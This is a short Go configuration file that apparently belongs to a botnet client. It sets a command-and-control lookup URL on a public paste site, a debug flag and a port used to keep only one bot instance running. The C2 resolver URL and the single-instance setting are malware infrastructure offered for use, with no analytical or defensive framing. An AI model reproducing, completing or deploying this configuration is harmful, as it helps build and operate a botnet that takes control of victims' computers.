package main

var (
	cnc_addr             = "https://rentry.co/ibv7p/raw" // url that return cnc addr:port in raw format.
	debug_mode           = true                          // show logs in console.
	single_instance_port = 13370                         // port to bind, this port is used for check if another instance of the bot is running to avoid duplicate session.
)
